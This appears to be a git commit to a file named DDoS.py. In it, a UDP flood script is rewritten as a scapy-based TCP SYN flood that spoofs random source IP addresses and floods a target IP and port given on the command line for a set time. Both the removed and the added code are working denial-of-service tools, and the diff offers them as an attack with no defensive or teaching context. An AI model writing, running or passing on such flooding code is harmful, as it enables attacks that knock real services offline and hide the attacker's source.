9ee3ccf28a2a229ed7885697b31ef6f219fe54c1
mmuazzam1610 <41737243+mmuazzam1610@users.noreply.github.com>
2019-03-14 02:30:53 +0500

    Update DDoS.py

--- DDoS.py
+++ DDoS.py
@@ -1,25 +1,50 @@
 import os
-import socket
+from scapy.all import *
 import time
 import sys
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-#############
 
-ip = sys.argv[1]
-starting_port = int(sys.argv[2])
-timeout = int(sys.argv[3])
-print("Attack Starting on IP %s", ip)
-send_bytes = os.urandom(1490)
-sent = 0
-port = starting_port
-start_time = time.time()
-while True:
-    sock.sendto(send_bytes, (ip, port))
-    sent = sent + 1
-    port = port + 1
-    if port == 65534:
-        port = starting_port
-    if time.time() - start_time > timeout:
-        break
+def randomIP():
+    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+    return ip
+
+
+def randInt():
+    x = random.randint(1000, 9000)
+    return x
+
+
+def SYN_Flood(dstIP, dstPort, timer):
+    total = 0
+    print("Packets are sending ...")
+    start_time = time.time()
+    while (time.time() - start_time) < timer:
+        s_port = randInt()
+        s_eq = randInt()
+        window = randInt()
+
+        IP_Packet = IP()
+        IP_Packet.src = randomIP()
+        IP_Packet.dst = dstIP
+
+        TCP_Packet = TCP()
+        TCP_Packet.sport = s_port
+        TCP_Packet.dport = dstPort
+        TCP_Packet.flags = "S"
+        TCP_Packet.seq = s_eq
+        TCP_Packet.window = window
+
+        send(IP_Packet / TCP_Packet, verbose=0)
+        total += 1
+
+    print("\nTotal packets sent: %i\n" % total)
+
+
+if __name__ == "__main__":
+    target_ip = sys.argv[1]
+    starting_port = int(sys.argv[2])
+    timeout = int(sys.argv[3])
+    print("Attack Starting on IP", target_ip)
+    sent = 0
+    port = starting_port
+    SYN_Flood(target_ip, starting_port, timeout)
